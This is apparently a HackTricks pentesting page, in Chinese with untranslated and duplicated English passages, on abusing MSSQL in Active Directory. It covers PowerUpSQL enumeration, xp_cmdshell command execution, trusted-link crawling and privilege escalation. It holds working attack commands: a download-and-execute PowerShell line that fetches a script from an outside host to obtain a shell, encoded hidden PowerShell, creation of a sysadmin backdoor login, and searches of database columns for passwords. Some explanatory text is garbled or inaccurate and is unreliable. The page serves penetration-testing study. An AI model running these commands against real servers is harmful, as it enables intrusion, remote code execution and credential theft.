# MSSQL AD滥用

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 YouTube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)或**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向[hacktricks仓库](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud仓库](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。

</details>

## **MSSQL枚举/发现**

在这种情况下，PowerUpSQL是非常有用的PowerShell模块。
```powershell
Import-Module .\PowerupSQL.psd1
```
### 无需域会话从网络中枚举

If you have network access to an Active Directory (AD) environment but do not have a domain session, you can still perform enumeration to gather information about the AD infrastructure. This can be useful for reconnaissance purposes or when conducting a penetration test.

#### Enumerating SQL Server instances

One way to gather information is by enumerating SQL Server instances within the AD environment. SQL Server instances often contain valuable information, such as user credentials or sensitive data.

To enumerate SQL Server instances, you can use tools like `sqlcmd` or `osql` to connect to the SQL Server service and query for available instances. The following command can be used:

```plaintext
sqlcmd -S <server_name> -U <username> -P <password> -Q "SELECT name FROM sys.sysdatabases"
```

Replace `<server_name>`, `<username>`, and `<password>` with the appropriate values. This command will retrieve the names of the databases hosted on the SQL Server instance.

#### Enumerating SQL Server linked servers

Another technique is to enumerate SQL Server linked servers. Linked servers allow SQL Server to access data from other data sources, which can include other SQL Server instances or even non-SQL Server databases.

To enumerate linked servers, you can query the `sys.servers` table in the `master` database. The following command can be used:

```plaintext
sqlcmd -S <server_name> -U <username> -P <password> -d master -Q "SELECT name, data_source FROM sys.servers"
```

Replace `<server_name>`, `<username>`, and `<password>` with the appropriate values. This command will retrieve the names and data sources of the linked servers configured on the SQL Server instance.

#### Enumerating SQL Server databases

If you have access to a SQL Server instance, you can also enumerate the databases hosted on that instance. This can be done by querying the `sys.databases` table in the `master` database. The following command can be used:

```plaintext
sqlcmd -S <server_name> -U <username> -P <password> -d master -Q "SELECT name FROM sys.databases"
```

Replace `<server_name>`, `<username>`, and `<password>` with the appropriate values. This command will retrieve the names of the databases hosted on the SQL Server instance.

By enumerating SQL Server instances, linked servers, and databases, you can gather valuable information about the AD environment and potentially identify vulnerabilities or misconfigurations that can be exploited during a penetration test.
```powershell
# Get local MSSQL instance (if any)
Get-SQLInstanceLocal
Get-SQLInstanceLocal | Get-SQLServerInfo

#If you don't have a AD account, you can try to find MSSQL scanning via UDP
#First, you will need a list of hosts to scan
Get-Content c:\temp\computers.txt | Get-SQLInstanceScanUDP –Verbose –Threads 10

#If you have some valid credentials and you have discovered valid MSSQL hosts you can try to login into them
#The discovered MSSQL servers must be on the file: C:\temp\instances.txt
Get-SQLInstanceFile -FilePath C:\temp\instances.txt | Get-SQLConnectionTest -Verbose -Username test -Password test
```
### 从域内进行枚举

When conducting a penetration test or security assessment, it is important to gather as much information as possible about the target Active Directory (AD) environment. Enumerating from inside the domain allows for a deeper understanding of the network and potential vulnerabilities.

在进行渗透测试或安全评估时，收集有关目标Active Directory（AD）环境的尽可能多的信息非常重要。从域内进行枚举可以更深入地了解网络和潜在的漏洞。

#### Enumerating SQL Server instances

#### 枚举SQL Server实例

One way to gather information is by enumerating SQL Server instances within the AD environment. This can be done using various methods, such as:

通过枚举AD环境中的SQL Server实例来收集信息是一种方法。可以使用各种方法来实现这一点，例如：

- **SQL Server Browser Service**: The SQL Server Browser service listens on UDP port 1434 and provides information about SQL Server instances running on the network. By querying this service, it is possible to obtain a list of SQL Server instances and their corresponding ports.

- **SQL Server浏览器服务**：SQL Server浏览器服务监听UDP端口1434，并提供有关网络上运行的SQL Server实例的信息。通过查询此服务，可以获取SQL Server实例及其相应端口的列表。

- **SQL Server Configuration Manager**: The SQL Server Configuration Manager is a Microsoft Management Console (MMC) snap-in that provides a graphical interface for managing SQL Server services and network protocols. It can be used to view and modify the configuration settings of SQL Server instances.

- **SQL Server配置管理器**：SQL Server配置管理器是一个Microsoft Management Console（MMC）插件，提供了一个图形界面来管理SQL Server服务和网络协议。它可以用于查看和修改SQL Server实例的配置设置。

- **SQL Server Discovery**: By sending UDP packets to port 1434, it is possible to discover SQL Server instances running on the network. This can be done using tools like `sqlcmd` or `osql`.

- **SQL Server发现**：通过向端口1434发送UDP数据包，可以发现在网络上运行的SQL Server实例。可以使用`sqlcmd`或`osql`等工具来完成此操作。

Once the SQL Server instances have been enumerated, further analysis can be performed to identify potential vulnerabilities or misconfigurations that could be exploited.

一旦枚举了SQL Server实例，就可以进行进一步的分析，以识别可能存在的漏洞或可利用的配置错误。

#### Enumerating SQL Server databases

#### 枚举SQL Server数据库

After identifying the SQL Server instances, the next step is to enumerate the databases hosted on each instance. This can be done using various methods, such as:

在确定了SQL Server实例之后，下一步是枚举托管在每个实例上的数据库。可以使用各种方法来实现这一点，例如：

- **SQL Server Management Studio (SSMS)**: SSMS is a graphical tool provided by Microsoft for managing SQL Server. It can be used to connect to a SQL Server instance and view the list of databases.

- **SQL Server Management Studio（SSMS）**：SSMS是由Microsoft提供的用于管理SQL Server的图形工具。可以使用它连接到SQL Server实例并查看数据库列表。

- **SQL Server Command Line Tools**: Tools like `sqlcmd` or `osql` can be used to execute SQL queries against a SQL Server instance and retrieve information about the databases.

- **SQL Server命令行工具**：可以使用`sqlcmd`或`osql`等工具对SQL Server实例执行SQL查询，并检索有关数据库的信息。

- **SQL Server Information Schema**: The SQL Server Information Schema is a set of views that provide information about the tables, columns, and other database objects within a SQL Server database. Queries can be executed against these views to retrieve metadata about the databases.

- **SQL Server信息模式**：SQL Server信息模式是一组视图，提供有关SQL Server数据库中的表、列和其他数据库对象的信息。可以对这些视图执行查询以检索有关数据库的元数据。

By enumerating the SQL Server databases, it is possible to gather valuable information about the data stored within the AD environment, such as sensitive information or potential targets for further exploitation.

通过枚举SQL Server数据库，可以收集有关存储在AD环境中的数据的有价值的信息，例如敏感信息或进一步利用的潜在目标。
```powershell
# Get local MSSQL instance (if any)
Get-SQLInstanceLocal
Get-SQLInstanceLocal | Get-SQLServerInfo

#Get info about valid MSQL instances running in domain
#This looks for SPNs that starts with MSSQL (not always is a MSSQL running instance)
Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose

#Test connections with each one
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -verbose

#Try to connect and obtain info from each MSSQL server (also useful to check conectivity)
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose

# Get DBs, test connections and get info in oneliner
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
```
## MSSQL基本滥用

### 访问数据库

To access a MSSQL database, you can use various methods:

- **SQL Server Management Studio (SSMS):** This is the official graphical tool provided by Microsoft to manage MSSQL databases. It allows you to connect to a remote MSSQL server and access the databases.

- **Command Line Tools:** MSSQL provides command line tools such as `sqlcmd` and `osql` that allow you to execute SQL queries and commands directly from the command prompt.

- **Programming Languages:** You can use programming languages like Python, Java, or C# to connect to a MSSQL database and perform operations on it.

- **Third-Party Tools:** There are also third-party tools available that provide additional features and functionalities for working with MSSQL databases.

To access a MSSQL database, you will need the following information:

- **Server Name:** The name or IP address of the MSSQL server you want to connect to.

- **Authentication Method:** MSSQL supports two authentication methods: Windows Authentication and SQL Server Authentication. Windows Authentication uses the credentials of the currently logged-in Windows user, while SQL Server Authentication requires a username and password.

- **Database Name:** The name of the specific database you want to access.

Once you have the necessary information, you can use the appropriate method to connect to the MSSQL database and start accessing its contents.
```powershell
#Perform a SQL query
Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select @@servername"

#Dump an instance (a lotof CVSs generated in current dir)
Invoke-SQLDumpInfo -Verbose -Instance "dcorp-mssql"

# Search keywords in columns trying to access the MSSQL DBs
## This won't use trusted SQL links
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLColumnSampleDataThreaded -Keywords "password" -SampleSize 5 | select instance, database, column, sample | ft -autosize
```
### MSSQL远程命令执行（RCE）

在MSSQL主机内部可能还可以执行命令。
```powershell
Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
# Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
```
### MSSQL基础黑客技巧

{% content-ref url="../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/" %}
[pentesting-mssql-microsoft-sql-server](../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/)
{% endcontent-ref %}

## MSSQL信任链接

如果一个MSSQL实例被另一个MSSQL实例信任（数据库链接）。如果用户对信任数据库拥有权限，他将能够**利用信任关系在其他实例中执行查询**。这些信任关系可以被链接在一起，用户可能会找到一些配置错误的数据库，从而执行命令。

**数据库之间的链接甚至可以跨越域信任。**

### Powershell滥用
```powershell
#Look for MSSQL links of an accessible instance
Get-SQLServerLink -Instance dcorp-mssql -Verbose #Check for DatabaseLinkd > 0

#Crawl trusted links, starting from the given one (the user being used by the MSSQL instance is also specified)
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Verbose

#If you are sysadmin in some trusted link you can enable xp_cmdshell with:
Get-SQLServerLinkCrawl -instance "<INSTANCE1>" -verbose -Query 'EXECUTE(''sp_configure ''''xp_cmdshell'''',1;reconfigure;'') AT "<INSTANCE2>"'

#Execute a query in all linked instances (try to execute commands), output should be in CustomQuery field
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Query "exec master..xp_cmdshell 'whoami'"

#Obtain a shell
Get-SQLServerLinkCrawl -Instance dcorp-mssql  -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1'')"'

#Check for possible vulnerabilities on an instance where you have access
Invoke-SQLAudit -Verbose -Instance "dcorp-mssql.dollarcorp.moneycorp.local"

#Try to escalate privileges on an instance
Invoke-SQLEscalatePriv –Verbose –Instance "SQLServer1\Instance1"

#Manual trusted link queery
Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select * from openquery(""sql2.domain.io"", 'select * from information_schema.tables')"
## Enable xp_cmdshell and check it
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'SELECT * FROM OPENQUERY("sql2.domain.io", ''SELECT * FROM sys.configurations WHERE name = ''''xp_cmdshell'''''');'
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT [sql.rto.external]'
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''xp_cmdshell'''', 1; reconfigure;'') AT [sql.rto.external]'
## If you see the results of @@selectname, it worked
Get-SQLQuery -Instance "sql.rto.local,1433" -Query 'SELECT * FROM OPENQUERY("sql.rto.external", ''select @@servername; exec xp_cmdshell ''''powershell whoami'''''');'
```
### Metasploit

您可以使用Metasploit轻松检查受信任的链接。
```bash
#Set username, password, windows auth (if using AD), IP...
msf> use exploit/windows/mssql/mssql_linkcrawler
[msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
```
请注意，Metasploit只会尝试滥用MSSQL中的`openquery()`函数（因此，如果您无法使用`openquery()`执行命令，则需要尝试使用`EXECUTE`方法**手动**执行命令，详见下文）。

### 手动 - Openquery()

从**Linux**中，您可以使用**sqsh**和**mssqlclient.py**获取MSSQL控制台shell。

从**Windows**中，您也可以找到链接并手动执行命令，使用像[**HeidiSQL**](https://www.heidisql.com)这样的**MSSQL客户端**。

_使用Windows身份验证登录：_

![](<../../.gitbook/assets/image (167) (1).png>)

#### 查找可信链接
```sql
select * from master..sysservers
```
![](<../../.gitbook/assets/image (168).png>)

#### 在可信链接中执行查询

通过链接执行查询（例如：在新的可访问实例中查找更多链接）：
```sql
select * from openquery("dcorp-sql1", 'select * from master..sysservers')
```
{% hint style="warning" %}
请注意双引号和单引号的使用方式，这一点非常重要。
{% endhint %}

![](<../../.gitbook/assets/image (169).png>)

您可以手动无限延续这些可信链接链。
```sql
# First level RCE
SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')

# Second level RCE
SELECT * FROM OPENQUERY("<computer1>", 'select * from openquery("<computer2>", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''''')')
```
如果您无法从`openquery()`执行`exec xp_cmdshell`等操作，请尝试使用`EXECUTE`方法。

### 手动 - EXECUTE

您还可以使用`EXECUTE`滥用受信任的链接：
```bash
#Create user and give admin privileges
EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
```
## 本地权限提升

**MSSQL本地用户**通常具有一种特殊的权限，称为**`SeImpersonatePrivilege`**。这允许该账户在身份验证后"模拟客户端"。

许多作者提出的一种策略是强制一个SYSTEM服务对攻击者创建的恶意或中间人服务进行身份验证。在SYSTEM服务尝试进行身份验证时，这个恶意服务可以冒充SYSTEM服务。

[SweetPotato](https://github.com/CCob/SweetPotato)收集了这些不同的技术，可以通过Beacon的`execute-assembly`命令执行。

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？想要在HackTricks中**宣传你的公司**吗？或者你想要**获取PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[NFT收藏品**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。

</details>
